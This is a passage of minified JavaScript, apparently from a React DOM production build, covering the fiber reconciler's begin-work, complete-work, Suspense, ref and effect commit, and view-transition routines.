l?(ja(),l=r.fallback,u=n.mode,R=t.child,I=R.sibling,r=pa(R,{mode:"hidden",children:r.children}),r.subtreeFlags=R.subtreeFlags&1206910976,I!==null?l=pa(I,l):(l=Er(l,u,a,null),l.flags|=2),l.return=n,r.return=n,r.sibling=l,n.child=r,zo(null,r),r=n.child,l=t.child.memoizedState,l===null?l=td(a):(u=l.cachePool,u!==null?(R=dn._currentValue,u=u.parent!==R?{parent:R,pool:R}:u):u=i0(),l={baseLanes:l.baseLanes|a,cachePool:u}),r.memoizedState=l,r.childLanes=ed(t,g,a),n.memoizedState=$f,zo(t.child,r)):(Ka(n),a=t.child,t=a.sibling,a=pa(a,{mode:"visible",children:r.children}),a.return=n,a.sibling=null,t!==null&&(g=n.deletions,g===null?(n.deletions=[t],n.flags|=16):g.push(t)),n.child=a,n.memoizedState=null,a)}function nd(t,n){return n=fc({mode:"visible",children:n},t.mode),n.return=t,t.child=n}function fc(t,n){return t=qn(22,t,null,n),t.lanes=0,t}function dc(t,n,a){return Ur(n,t.child,null,a),t=nd(n,n.pendingProps.children),t.flags|=2,n.memoizedState=null,t}function Oy(t,n,a,r,l,u,g,R){if(a)return n.flags&256?(Ka(n),n.flags&=-257,dc(t,n,R)):n.memoizedState!==null?(ja(),n.child=t.child,n.flags|=128,null):(ja(),u=l.fallback,g=n.mode,l=fc({mode:"visible",children:l.children},g),u=Er(u,g,R,null),u.flags|=2,l.return=n,u.return=n,l.sibling=u,n.child=l,Ur(n,t.child,null,R),l=n.child,l.memoizedState=td(R),l.childLanes=ed(t,r,R),n.memoizedState=$f,zo(null,l));if(Ka(n),th(u)){if(r=u.nextSibling&&u.nextSibling.dataset,r)var I=r.dgst;return r=I,r!==""&&(l=Error(s(419)),l.stack="",l.digest=r,To({value:l,source:null,stack:null})),dc(t,n,R)}if(pn||Ar(t,n,R,!1),r=(R&t.childLanes)!==0,pn||r){if(Za.current!==null)return dc(t,n,R);if(r=Ke,r!==null&&(l=fo(r,R),l!==0&&l!==g.retryLane))throw g.retryLane=l,Mr(t,l),jn(r,t,l),Qf;return $d(u)||Nc(),dc(t,n,R)}return $d(u)?(n.flags|=192,n.child=t.child,null):(t=g.treeContext,Qe=yi(u.nextSibling),Mn=n,xe=!0,Ga=null,xi=!1,t!==null&&Qm(n,t),n=nd(n,l.children),n.flags|=134221824,n)}function gg(t,n,a){t.lanes|=n;var r=t.alternate;r!==null&&(r.lanes|=n),kl(t.return,n,a)}function _g(t){for(var n=null;t!==null;){var a=t.alternate;a!==null&&$l(a)===null&&(n=t),t=t.sibling}return n}function hc(t,n,a,r,l,u){var g=t.memoizedState;g===null?t.memoizedState={isBackwards:n,rendering:null,renderingStartTime:0,last:r,tail:a,tailMode:l,treeForkCount:u}:(g.isBackwards=n,g.rendering=null,g.renderingStartTime=0,g.last=r,g.tail=a,g.tailMode=l,g.treeForkCount=u)}function id(t){var n=t.child;for(t.child=null;n!==null;){var a=n.sibling;n.sibling=t.child,t.child=n,n=a}}function ad(t,n,a){var r=n.pendingProps,l=r.revealOrder,u=r.tail;r=r.children;var g=Cn.current;if(n.flags&128)return Lo(n,g),null;var R=(g&2)!==0;if(R?(g=g&1|2,n.flags|=128):g&=1,Lo(n,g),l==="backwards"&&t!==null?(id(t),xn(t,n,r,a),id(t)):xn(t,n,r,a),r=xe?bo:0,!R&&t!==null&&(t.flags&128)!==0)t:for(t=n.child;t!==null;){if(t.tag===13)t.memoizedState!==null&&gg(t,a,n);else if(t.tag===19)gg(t,a,n);else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===n)break t;for(;t.sibling===null;){if(t.return===null||t.return===n)break t;t=t.return}t.sibling.return=t.return,t=t.sibling}switch(l){case"backwards":a=_g(n.child),a===null?(l=n.child,n.child=null):(l=a.sibling,a.sibling=null,id(n)),hc(n,!0,l,null,u,r);break;case"unstable_legacy-backwards":for(a=null,l=n.child,n.child=null;l!==null;){if(t=l.alternate,t!==null&&$l(t)===null){n.child=l;break}t=l.sibling,l.sibling=a,a=l,l=t}hc(n,!0,a,null,u,r);break;case"together":hc(n,!1,null,null,void 0,r);break;case"independent":n.memoizedState=null;break;default:a=_g(n.child),a===null?(l=n.child,n.child=null):(l=a.sibling,a.sibling=null),hc(n,!1,l,a,u,r)}return n.child}function vg(t,n,a){var r=n.pendingProps;return Xa(n,n.type,r.value),xn(t,n,r.children,a),n.child}function Sa(t,n,a){if(t!==null&&(n.dependencies=t.dependencies),tr|=n.lanes,(a&n.childLanes)===0)if(t!==null){if(Ar(t,n,a,!1),(a&n.childLanes)===0)return null}else return null;if(t!==null&&n.child!==t.child)throw Error(s(153));if(n.child!==null){for(t=n.child,a=pa(t,t.pendingProps),n.child=a,a.return=n;t.sibling!==null;)t=t.sibling,a=a.sibling=pa(t,t.pendingProps),a.return=n;a.sibling=null}return n.child}function rd(t,n){return(t.lanes&n)!==0?!0:(t=t.dependencies,!!(t!==null&&Wl(t)))}function Py(t,n,a){switch(n.tag){case 3:k(n,n.stateNode.containerInfo),Xa(n,dn,t.memoizedState.cache),br();break;case 27:case 5:Oe(n);break;case 4:k(n,n.stateNode.containerInfo);break;case 10:Xa(n,n.type,n.memoizedProps.value);break;case 31:if(n.memoizedState!==null)return n.flags|=128,Nf(n),null;break;case 13:var r=n.memoizedState;if(r!==null){if(r.dehydrated!==null)return Ka(n),n.flags|=128,null;r=Ar(t,n,a,!1);var l=n.child.childLanes;return r||(a&l)!==0?mg(t,n,a):(Ka(n),t=Sa(t,n,a),t!==null?t.sibling:null)}Ka(n);break;case 19:if(n.flags&128)return ad(t,n,a);if(l=(t.flags&128)!==0,r=(a&n.childLanes)!==0,r||(Ar(t,n,a,!1),r=(a&n.childLanes)!==0),l){if(r)return ad(t,n,a);n.flags|=128}if(l=n.memoizedState,l!==null&&(l.rendering=null,l.tail=null,l.lastEffect=null),Lo(n,Cn.current),r)break;return null;case 22:return n.lanes=0,cg(t,n,a,n.pendingProps);case 24:Xa(n,dn,t.memoizedState.cache)}return Sa(t,n,a)}function xg(t,n,a){if(t!==null)if(t.memoizedProps!==n.pendingProps)pn=!0;else{if(!rd(t,a)&&(n.flags&128)===0)return pn=!1,Py(t,n,a);pn=(t.flags&131072)!==0}else pn=!1,xe&&(n.flags&1048576)!==0&&jm(n,bo,n.index);switch(n.lanes=0,n.tag){case 16:t:{var r=n.pendingProps;if(t=Nr(n.elementType),n.type=t,typeof t=="function")df(t)?(r=Or(t,r),n.tag=1,n=hg(null,n,t,r,a)):(n.tag=0,n=Jf(null,n,t,r,a));else{if(t!=null){var l=t.$$typeof;if(l===q){n.tag=11,n=sg(null,n,t,r,a);break t}else if(l===lt){n.tag=14,n=og(null,n,t,r,a);break t}else if(l===et){n.tag=10,n.type=t,n=vg(null,n,a);break t}}throw n=Tt(t)||t,Error(s(306,n,""))}}return n;case 0:return Jf(t,n,n.type,n.pendingProps,a);case 1:return r=n.type,l=Or(r,n.pendingProps),hg(t,n,r,l,a);case 3:t:{if(k(n,n.stateNode.containerInfo),t===null)throw Error(s(387));r=n.pendingProps;var u=n.memoizedState;l=u.element,Tf(t,n),Uo(n,r,null,a);var g=n.memoizedState;if(r=g.cache,Xa(n,dn,r),r!==u.cache&&xf(n,[dn],a,!0),Do(),r=g.element,u.isDehydrated)if(u={element:r,isDehydrated:!1,cache:g.cache},n.updateQueue.baseState=u,n.memoizedState=u,n.flags&256){n=pg(t,n,r,a);break t}else if(r!==l){l=gi(Error(s(424)),n),To(l),n=pg(t,n,r,a);break t}else{switch(t=n.stateNode.containerInfo,t.nodeType){case 9:t=t.body;break;default:t=t.nodeName==="HTML"?t.ownerDocument.body:t}for(Qe=yi(t.firstChild),Mn=n,xe=!0,Ga=null,xi=!0,a=c0(n,null,r,a),n.child=a;a;)a.flags=a.flags&-3|134221824,a=a.sibling}else{if(br(),r===l){n=Sa(t,n,a);break t}xn(t,n,r,a)}n=n.child}return n;case 26:return xs(t,n),t===null?(a=k_(n.type,null,n.pendingProps,null))?n.memoizedState=a:xe||(n.stateNode=E_(n.type,n.pendingProps,Pe.current,n)):n.memoizedState=k_(n.type,t.memoizedProps,n.pendingProps,t.memoizedState),null;case 27:return Oe(n),t===null&&xe&&(r=n.stateNode=H_(n.type,n.pendingProps,Pe.current),Mn=n,xi=!0,l=Qe,ar(n.type)?(eh=l,Qe=yi(r.firstChild)):Qe=l),xn(t,n,n.pendingProps.children,a),xs(t,n),t===null&&(n.flags|=4194304),n.child;case 5:return t===null&&xe&&((l=r=Qe)&&(r=wM(r,n.type,n.pendingProps,xi),r!==null?(n.stateNode=r,Mn=n,Qe=yi(r.firstChild),xi=!1,l=!0):l=!1),l||Va(n)),Oe(n),l=n.type,u=n.pendingProps,g=t!==null?t.memoizedProps:null,r=u.children,qd(l,u)?r=null:g!==null&&qd(l,g)&&(n.flags|=32),n.memoizedState!==null&&(l=Lf(t,n,by,null,null,a),zs._currentValue=l),xs(t,n),xn(t,n,r,a),n.child;case 6:return t===null&&xe&&((t=a=Qe)&&(a=NM(a,n.pendingProps,xi),a!==null?(n.stateNode=a,Mn=n,Qe=null,t=!0):t=!1),t||Va(n)),null;case 13:return mg(t,n,a);case 4:return k(n,n.stateNode.containerInfo),r=n.pendingProps,t===null?n.child=Ur(n,null,r,a):xn(t,n,r,a),n.child;case 11:return sg(t,n,n.type,n.pendingProps,a);case 7:return r=n.pendingProps,xs(t,n),xn(t,n,r,a),n.child;case 8:return xn(t,n,n.pendingProps.children,a),n.child;case 12:return xn(t,n,n.pendingProps.children,a),n.child;case 10:return vg(t,n,a);case 9:return l=n.type._context,r=n.pendingProps.children,Rr(n),l=An(l),r=r(l),n.flags|=1,xn(t,n,r,a),n.child;case 14:return og(t,n,n.type,n.pendingProps,a);case 15:return lg(t,n,n.type,n.pendingProps,a);case 19:return ad(t,n,a);case 31:return Ly(t,n,a);case 22:return cg(t,n,a,n.pendingProps);case 24:return Rr(n),r=An(dn),t===null?(l=Mf(),l===null&&(l=Ke,u=Sf(),l.pooledCache=u,u.refCount++,u!==null&&(l.pooledCacheLanes|=a),l=u),n.memoizedState={parent:r,cache:l},bf(n),Xa(n,dn,l)):((t.lanes&a)!==0&&(Tf(t,n),Uo(n,null,null,a),Do()),l=t.memoizedState,u=n.memoizedState,l.parent!==r?(l={parent:r,cache:r},n.memoizedState=l,n.lanes===0&&(n.memoizedState=n.updateQueue.baseState=l),Xa(n,dn,r)):(r=u.cache,Xa(n,dn,r),r!==l.cache&&xf(n,[dn],a,!0))),xn(t,n,n.pendingProps.children,a),n.child;case 30:return n.stateNode===null&&(n.stateNode={autoName:null,paired:null,clones:null,ref:null}),r=n.pendingProps,r.name!=null&&r.name!=="auto"?n.flags|=t===null?18882560:18874368:xe&&Vl(n),t!==null&&t.memoizedProps.name!==r.name?n.flags|=4194816:xs(t,n),xn(t,n,r.children,a),n.child;case 29:throw n.pendingProps}throw Error(s(156,n.tag))}function ya(t){t.flags|=4}function sd(t,n,a,r,l){var u;if((u=(t.mode&32)!==0)&&(u=a===null?Z_(n,r):Z_(n,r)&&(r.src!==a.src||r.srcSet!==a.srcSet)),u){if(t.flags|=16777216,(l&335544128)===l)if(t.stateNode.complete)t.flags|=8192;else if(t_())t.flags|=8192;else throw Dr=Kl,Ef}else t.flags&=-16777217}function Sg(t,n){if(n.type!=="stylesheet"||(n.state.loading&4)!==0)t.flags&=-16777217;else if(t.flags|=16777216,!K_(n))if(t_())t.flags|=8192;else throw Dr=Kl,Ef}function pc(t,n){n!==null&&(t.flags|=4),t.flags&16384&&(n=t.tag!==22?co():536870912,t.lanes|=n,bs|=n)}function Bo(t,n){if(!xe)switch(t.tailMode){case"visible":break;case"collapsed":for(var a=t.tail,r=null;a!==null;)a.alternate!==null&&(r=a),a=a.sibling;r===null?n||t.tail===null?t.tail=null:t.tail.sibling=null:r.sibling=null;break;default:for(n=t.tail,a=null;n!==null;)n.alternate!==null&&(a=n),n=n.sibling;a===null?t.tail=null:a.sibling=null}}function Je(t){var n=t.alternate!==null&&t.alternate.child===t.child,a=0,r=0;if(n)for(var l=t.child;l!==null;)a|=l.lanes|l.childLanes,r|=l.subtreeFlags&1206910976,r|=l.flags&1206910976,l.return=t,l=l.sibling;else for(l=t.child;l!==null;)a|=l.lanes|l.childLanes,r|=l.subtreeFlags,r|=l.flags,l.return=t,l=l.sibling;return t.subtreeFlags|=r,t.childLanes=a,n}function Iy(t,n,a){var r=n.pendingProps;switch(mf(n),n.tag){case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return Je(n),null;case 1:return Je(n),null;case 3:return a=n.stateNode,r=null,t!==null&&(r=t.memoizedState.cache),n.memoizedState.cache!==r&&(n.flags|=2048),_a(dn),en(),a.pendingContext&&(a.context=a.pendingContext,a.pendingContext=null),(t===null||t.child===null)&&(ds(n)?ya(n):t===null||t.memoizedState.isDehydrated&&(n.flags&256)===0||(n.flags|=1024,_f())),Je(n),null;case 26:var l=n.type,u=n.memoizedState;return t===null?(ya(n),u!==null?(Je(n),Sg(n,u)):(Je(n),sd(n,l,null,r,a))):u?u!==t.memoizedState?(ya(n),Je(n),Sg(n,u)):(Je(n),n.flags&=-16777217):(t=t.memoizedProps,t!==r&&ya(n),Je(n),sd(n,l,t,r,a)),null;case 27:if(O(n),a=Pe.current,l=n.type,t!==null&&n.stateNode!=null)t.memoizedProps!==r&&ya(n);else{if(!r){if(n.stateNode===null)throw Error(s(166));return Je(n),n.subtreeFlags&=-33554433,null}t=Ve.current,ds(n)?Jm(n):(t=H_(l,r,a),n.stateNode=t,ya(n))}return Je(n),n.subtreeFlags&=-33554433,null;case 5:if(O(n),l=n.type,t!==null&&n.stateNode!=null)t.memoizedProps!==r&&ya(n);else{if(!r){if(n.stateNode===null)throw Error(s(166));return Je(n),n.subtreeFlags&=-33554433,null}if(u=Ve.current,ds(n))Jm(n);else{var g=Ko(Pe.current);switch(u){case 1:u=g.createElementNS("http://www.w3.org/2000/svg",l);break;case 2:u=g.createElementNS("http://www.w3.org/1998/Math/MathML",l);break;default:switch(l){case"svg":u=g.createElementNS("http://www.w3.org/2000/svg",l);break;case"math":u=g.createElementNS("http://www.w3.org/1998/Math/MathML",l);break;case"script":u=g.createElement("div"),u.innerHTML="<script><\/script>",u=u.removeChild(u.firstChild);break;case"select":u=typeof r.is=="string"?g.createElement("select",{is:r.is}):g.createElement("select"),r.multiple?u.multiple=!0:r.size&&(u.size=r.size);break;default:u=typeof r.is=="string"?g.createElement(l,{is:r.is}):g.createElement(l)}}u[A]=n,u[H]=r;t:for(g=n.child;g!==null;){if(g.tag===5||g.tag===6)u.appendChild(g.stateNode);else if(g.tag!==4&&g.tag!==27&&g.child!==null){g.child.return=g,g=g.child;continue}if(g===n)break t;for(;g.sibling===null;){if(g.return===null||g.return===n)break t;g=g.return}g.sibling.return=g.return,g=g.sibling}n.stateNode=u;t:switch(Nn(u,l,r),l){case"button":case"input":case"select":case"textarea":r=!!r.autoFocus;break t;case"img":r=!0;break t;default:r=!1}r&&ya(n)}}return Je(n),n.subtreeFlags&=-33554433,sd(n,n.type,t===null?null:t.memoizedProps,n.pendingProps,a),null;case 6:if(t&&n.stateNode!=null)t.memoizedProps!==r&&ya(n);else{if(typeof r!="string"&&n.stateNode===null)throw Error(s(166));if(t=Pe.current,ds(n)){if(t=n.stateNode,a=n.memoizedProps,r=null,l=Mn,l!==null)switch(l.tag){case 27:case 5:r=l.memoizedProps}t[A]=n,t=!!(t.nodeValue===a||r!==null&&r.suppressHydrationWarning===!0||x_(t.nodeValue,a)),t||Va(n,!0)}else t=Ko(t).createTextNode(r),t[A]=n,n.stateNode=t}return Je(n),null;case 31:if(a=n.memoizedState,t===null||t.memoizedState!==null){if(r=ds(n),a!==null){if(t===null){if(!r)throw Error(s(318));if(t=n.memoizedState,t=t!==null?t.dehydrated:null,!t)throw Error(s(557));t[A]=n}else br(),(n.flags&128)===0&&(n.memoizedState=null),n.flags|=4;Je(n),t=!1}else a=_f(),t!==null&&t.memoizedState!==null&&(t.memoizedState.hydrationErrors=a),t=!0;if(!t)return n.flags&256?(ai(n),n):(ai(n),null);if((n.flags&128)!==0)throw Error(s(558))}return Je(n),null;case 13:if(r=n.memoizedState,t===null||t.memoizedState!==null&&t.memoizedState.dehydrated!==null){if(l=ds(n),r!==null&&r.dehydrated!==null){if(t===null){if(!l)throw Error(s(318));if(l=n.memoizedState,l=l!==null?l.dehydrated:null,!l)throw Error(s(317));l[A]=n}else br(),(n.flags&128)===0&&(n.memoizedState=null),n.flags|=4;Je(n),l=!1}else l=_f(),t!==null&&t.memoizedState!==null&&(t.memoizedState.hydrationErrors=l),l=!0;if(!l)return n.flags&256?(ai(n),n):(ai(n),null)}return ai(n),(n.flags&128)!==0?(n.lanes=a,n):(a=r!==null,t=t!==null&&t.memoizedState!==null,a&&(r=n.child,l=null,r.alternate!==null&&r.alternate.memoizedState!==null&&r.alternate.memoizedState.cachePool!==null&&(l=r.alternate.memoizedState.cachePool.pool),u=null,r.memoizedState!==null&&r.memoizedState.cachePool!==null&&(u=r.memoizedState.cachePool.pool),u!==l&&(r.flags|=2048)),a!==t&&a&&(n.child.flags|=8192),pc(n,n.updateQueue),Je(n),null);case 4:return en(),t===null&&Gd(n.stateNode.containerInfo),n.flags|=67108864,Je(n),null;case 10:return _a(n.type),Je(n),null;case 19:if(Df(n),r=n.memoizedState,r===null)return Je(n),null;if(l=(n.flags&128)!==0,u=r.rendering,u===null)if(l)Bo(r,!1);else{if(on!==0||t!==null&&(t.flags&128)!==0)for(t=n.child;t!==null;){if(u=$l(t),u!==null){for(n.flags|=128,Bo(r,!1),t=u.updateQueue,n.updateQueue=t,pc(n,t),n.subtreeFlags=0,t=a,a=n.child;a!==null;)Ym(a,t),a=a.sibling;return Lo(n,Cn.current&1|2),xe&&ma(n,r.treeForkCount),n.child}t=t.sibling}r.tail!==null&&Wt()>Ac&&(n.flags|=128,l=!0,Bo(r,!1),n.lanes=4194304)}else{if(!l)if(t=$l(u),t!==null){if(n.flags|=128,l=!0,t=t.updateQueue,n.updateQueue=t,pc(n,t),Bo(r,!0),r.tail===null&&r.tailMode!=="collapsed"&&r.tailMode!=="visible"&&!u.alternate&&!xe)return Je(n),null}else 2*Wt()-r.renderingStartTime>Ac&&a!==536870912&&(n.flags|=128,l=!0,Bo(r,!1),n.lanes=4194304);r.isBackwards?(u.sibling=n.child,n.child=u):(t=r.last,t!==null?t.sibling=u:n.child=u,r.last=u)}if(r.tail!==null){t=r.tail;t:{for(a=t;a!==null;){if(a.alternate!==null){a=!1;break t}a=a.sibling}a=!0}return r.rendering=t,r.tail=t.sibling,r.renderingStartTime=Wt(),t.sibling=null,u=Cn.current,u=l?u&1|2:u&1,r.tailMode==="visible"||r.tailMode==="collapsed"||!a||xe?Lo(n,u):(a=u,ie(Rn,n),ie(Cn,a),Ln===null&&(Ln=n)),xe&&ma(n,r.treeForkCount),t}return Je(n),null;case 22:case 23:return ai(n),wf(),r=n.memoizedState!==null,t!==null?t.memoizedState!==null!==r&&(n.flags|=8192):r&&(n.flags|=8192),r?(a&536870912)!==0&&(n.flags&128)===0&&(Je(n),n.subtreeFlags&6&&(n.flags|=8192)):Je(n),a=n.updateQueue,a!==null&&pc(n,a.retryQueue),a=null,t!==null&&t.memoizedState!==null&&t.memoizedState.cachePool!==null&&(a=t.memoizedState.cachePool.pool),r=null,n.memoizedState!==null&&n.memoizedState.cachePool!==null&&(r=n.memoizedState.cachePool.pool),r!==a&&(n.flags|=2048),t!==null&&ee(wr),null;case 24:return a=null,t!==null&&(a=t.memoizedState.cache),n.memoizedState.cache!==a&&(n.flags|=2048),_a(dn),Je(n),null;case 25:return null;case 30:return n.flags|=33554432,Je(n),null}throw Error(s(156,n.tag))}function zy(t,n){switch(mf(n),n.tag){case 1:return t=n.flags,t&65536?(n.flags=t&-65537|128,n):null;case 3:return _a(dn),en(),t=n.flags,(t&65536)!==0&&(t&128)===0?(n.flags=t&-65537|128,n):null;case 26:case 27:case 5:return O(n),null;case 31:if(n.memoizedState!==null){if(ai(n),n.alternate===null)throw Error(s(340));br()}return t=n.flags,t&65536?(n.flags=t&-65537|128,n):null;case 13:if(ai(n),t=n.memoizedState,t!==null&&t.dehydrated!==null){if(n.alternate===null)throw Error(s(340));br()}return t=n.flags,t&65536?(n.flags=t&-65537|128,n):null;case 19:return Df(n),t=n.flags,t&65536?(n.flags=t&-65537|128,t=n.memoizedState,t!==null&&(t.rendering=null,t.tail=null),n.flags|=4,n):null;case 4:return en(),null;case 10:return _a(n.type),null;case 22:case 23:return ai(n),wf(),t!==null&&ee(wr),t=n.flags,t&65536?(n.flags=t&-65537|128,n):null;case 24:return _a(dn),null;case 25:return null;default:return null}}function yg(t,n){switch(mf(n),n.tag){case 3:_a(dn),en();break;case 26:case 27:case 5:O(n);break;case 4:en();break;case 31:n.memoizedState!==null&&ai(n);break;case 13:ai(n);break;case 19:Df(n);break;case 10:_a(n.type);break;case 22:case 23:ai(n),wf(),t!==null&&ee(wr);break;case 24:_a(dn)}}function Fo(t,n){try{var a=n.updateQueue,r=a!==null?a.lastEffect:null;if(r!==null){var l=r.next;a=l;do{if((a.tag&t)===t){r=void 0;var u=a.create,g=a.inst;r=u(),g.destroy=r}a=a.next}while(a!==l)}}catch(R){ke(n,n.return,R)}}function Qa(t,n,a){try{var r=n.updateQueue,l=r!==null?r.lastEffect:null;if(l!==null){var u=l.next;r=u;do{if((r.tag&t)===t){var g=r.inst,R=g.destroy;if(R!==void 0){g.destroy=void 0,l=n;var I=a,Q=R;try{Q()}catch(ct){ke(l,I,ct)}}}r=r.next}while(r!==u)}}catch(ct){ke(n,n.return,ct)}}function Mg(t){var n=t.updateQueue;if(n!==null){var a=t.stateNode;try{f0(n,a)}catch(r){ke(t,t.return,r)}}}function Eg(t,n,a){a.props=Or(t.type,t.memoizedProps),a.state=t.memoizedState;try{a.componentWillUnmount()}catch(r){ke(t,n,r)}}function qi(t,n){try{var a=t.ref;if(a!==null){switch(t.tag){case 26:case 27:case 5:var r=t.stateNode;break;case 30:var l=t.stateNode,u=da(t.memoizedProps,l);(l.ref===null||l.ref.name!==u)&&(l.ref=N_(u)),r=l.ref;break;case 7:if(t.stateNode===null){var g=new ci(t);v(t.child,!1,RM,g,void 0,void 0),t.stateNode=g}r=t.stateNode;break;default:r=t.stateNode}typeof a=="function"?t.refCleanup=a(r):a.current=r}}catch(R){ke(t,n,R)}}function wn(t,n){var a=t.ref,r=t.refCleanup;if(a!==null)if(typeof r=="function")try{r()}catch(l){ke(t,n,l)}finally{t.refCleanup=null,t=t.alternate,t!=null&&(t.refCleanup=null)}else if(typeof a=="function")try{a(null)}catch(l){ke(t,n,l)}else a.current=null}function mc(t,n){if((t.tag===5||t.tag===27||t.tag===6)&&t.alternate===null&&n!==null)for(var a=0;a<n.length;a++)I_(t.stateNode,n[a])}function bg(t){for(var n=t.return;n!==null&&(ld(n)&&I_(t.stateNode,n.stateNode),!od(n));)n=n.return}function Ho(t){for(var n=t.return;n!==null&&(ld(n)&&CM(t.stateNode,n.stateNode),!od(n));)n=n.return}function od(t){return t.tag===5||t.tag===3||t.tag===27}function ld(t){return t&&t.tag===7&&t.stateNode!==null}function cd(t){var n=t.type,a=t.memoizedProps,r=t.stateNode;try{t:switch(n){case"button":case"input":case"select":case"textarea":a.autoFocus&&r.focus();break t;case"img":a.src?r.src=a.src:a.srcSet&&(r.srcset=a.srcSet)}}catch(l){ke(t,t.return,l)}}function ud(t,n,a){try{var r=t.stateNode;cM(r,t.type,a,n),r[H]=n}catch(l){ke(t,t.return,l)}}function Tg(t){return t.tag===5||t.tag===3||t.tag===26||t.tag===27&&ar(t.type)||t.tag===4}function fd(t){t:for(;;){for(;t.sibling===null;){if(t.return===null||Tg(t.return))return null;t=t.return}for(t.sibling.return=t.return,t=t.sibling;t.tag!==5&&t.tag!==6&&t.tag!==18;){if(t.tag===27&&ar(t.type)||t.flags&2||t.child===null||t.tag===4)continue t;t.child.return=t,t=t.child}if(!(t.flags&2))return t.stateNode}}function dd(t,n,a,r){var l=t.tag;if(l===5||l===6)l=t.stateNode,n?(a.nodeType===9?a.body:a.nodeName==="HTML"?a.ownerDocument.body:a).insertBefore(l,n):(n=a.nodeType===9?a.body:a.nodeName==="HTML"?a.ownerDocument.body:a,n.appendChild(l),a=a._reactRootContainer,a!=null||n.onclick!==null||(n.onclick=Xi)),mc(t,r),ve=!0;else if(l!==4&&(l===27&&(mc(t,r),r=null,ar(t.type)&&(a=t.stateNode,n=null)),t=t.child,t!==null))for(dd(t,n,a,r),t=t.sibling;t!==null;)dd(t,n,a,r),t=t.sibling}function gc(t,n,a,r){var l=t.tag;if(l===5||l===6)l=t.stateNode,n?a.insertBefore(l,n):a.appendChild(l),mc(t,r),ve=!0;else if(l!==4&&(l===27&&(mc(t,r),r=null,ar(t.type)&&(a=t.stateNode)),t=t.child,t!==null))for(gc(t,n,a,r),t=t.sibling;t!==null;)gc(t,n,a,r),t=t.sibling}function Ag(t){var n=t.stateNode,a=t.memoizedProps;try{for(var r=t.type,l=n.attributes;l.length;)n.removeAttributeNode(l[0]);Nn(n,r,a),n[A]=t,n[H]=a}catch(u){ke(t,t.return,u)}}var _c=!1,ri=null;function Rg(t){(t.tag===30||(t.subtreeFlags&33554432)!==0)&&(_c=!0)}var Yi=null;function Cg(){var t=Yi;return Yi=null,t}var Yn=0;function Ss(t,n,a,r,l){return Yn=0,wg(t.child,n,a,r,l)}function wg(t,n,a,r,l){for(var u=!1;t!==null;){if(t.tag===5){var g=t.stateNode;if(r!==null){var R=Kd(g);r.push(R),R.view&&(u=!0)}else u||Kd(g).view&&(u=!0);_c=!0,C_(g,Yn===0?n:n+"_"+Yn,a),Yn++}else(t.tag!==22||t.memoizedState===null)&&(t.tag===30&&l||wg(t.child,n,a,r,l)&&(u=!0));t=t.sibling}return u}function Zi(t,n){for(;t!==null;)t.tag===5?w_(t.stateNode,t.memoizedProps):(t.tag!==22||t.memoizedState===null)&&(t.tag===30&&n||Zi(t.child,n)),t=t.sibling}function vc(t){if((t.subtreeFlags&18874368)!==0)for(t=t.child;t!==null;){if((t.tag!==22||t.memoizedState===null)&&(vc(t),t.tag===30&&(t.flags&18874368)!==0&&t.stateNode.paired)){var n=t.memoizedProps;if(n.name==null||n.name==="auto")throw Error(s(544));var a=n.name;n=ha(n.default,n.share),n!=="none"&&(Ss(t,a,n,null,!1)||Zi(t.child,!1))}t=t.sibling}}function hd(t,n){if(t.tag===30){var a=t.stateNode,r=t.memoizedProps,l=da(r,a),u=ha(r.default,a.paired?r.share:r.enter);u!=="none"?Ss(t,l,u,null,!1)?(vc(t),a.paired||n||Cs(t,r.onEnter)):Zi(t.child,!1):vc(t)}else if((t.subtreeFlags&33554432)!==0)for(t=t.child;t!==null;)hd(t,n),t=t.sibling;else vc(t)}function pd(t){if(ri!==null&&ri.size!==0){var n=ri;if((t.subtreeFlags&18874368)!==0)for(t=t.child;t!==null;){if(t.tag!==22||t.memoizedState===null){if(t.tag===30&&(t.flags&18874368)!==0){var a=t.memoizedProps,r=a.name;if(r!=null&&r!=="auto"){var l=n.get(r);if(l!==void 0){var u=ha(a.default,a.share);if(u!=="none"&&(Ss(t,r,u,null,!1)?(u=t.stateNode,l.paired=u,u.paired=l,Cs(t,a.onShare)):Zi(t.child,!1)),n.delete(r),n.size===0)break}}}pd(t)}t=t.sibling}}}function md(t){if(t.tag===30){var n=t.memoizedProps,a=da(n,t.stateNode),r=ri!==null?ri.get(a):void 0,l=ha(n.default,r!==void 0?n.share:n.exit);l!=="none"&&(Ss(t,a,l,null,!1)?r!==void 0?(l=t.stateNode,r.paired=l,l.paired=r,ri.delete(a),Cs(t,n.onShare)):Cs(t,n.onExit):Zi(t.child,!1)),ri!==null&&pd(t)}else if((t.subtreeFlags&33554432)!==0)for(t=t.child;t!==null;)md(t),t=t.sibling;else ri!==null&&pd(t)}function Ng(t){for(t=t.child;t!==null;){if(t.tag===30){var n=t.memoizedProps,a=da(n,t.stateNode);n=ha(n.default,n.update),t.flags&=-5,n!=="none"&&Ss(t,a,n,t.memoizedState=[],!1)}else(t.subtreeFlags&33554432)!==0&&Ng(t);t=t.sibling}}function gd(t){if((t.subtreeFlags&18874368)!==0)for(t=t.child;t!==null;){if(t.tag!==22||t.memoizedState===null){if(t.tag===30&&(t.flags&18874368)!==0){var n=t.stateNode;n.paired!==null&&(n.paired=null,Zi(t.child,!1))}gd(t)}t=t.sibling}}function xc(t){if(t.tag===30)t.stateNode.paired=null,Zi(t.child,!1),gd(t);else if((t.subtreeFlags&33554432)!==0)for(t=t.child;t!==null;)xc(t),t=t.sibling;else gd(t)}function Dg(t){for(t=t.child;t!==null;)t.tag===30?Zi(t.child,!1):(t.subtreeFlags&33554432)!==0&&Dg(t),t=t.sibling}function _d(t,n,a,r,l,u,g){for(var R=!1;n!==null;){if(n.tag===5){var I=n.stateNode;if(u!==null&&Yn<u.length){var Q=u[Yn],ct=Kd(I);(Q.view||ct.view)&&(R=!0);var yt;if(yt=(t.flags&4)===0)if(ct.clip)yt=!0;else{yt=Q.rect;var Z=ct.rect;yt=yt.y!==Z.y||yt.x!==Z.x||yt.height!==Z.height||yt.width!==Z.width}yt&&(t.flags|=4),ct.abs?ct=!Q.abs:(Q=Q.rect,ct=ct.rect,ct=Q.height!==ct.height||Q.width!==ct.width),ct&&(t.flags|=32)}else 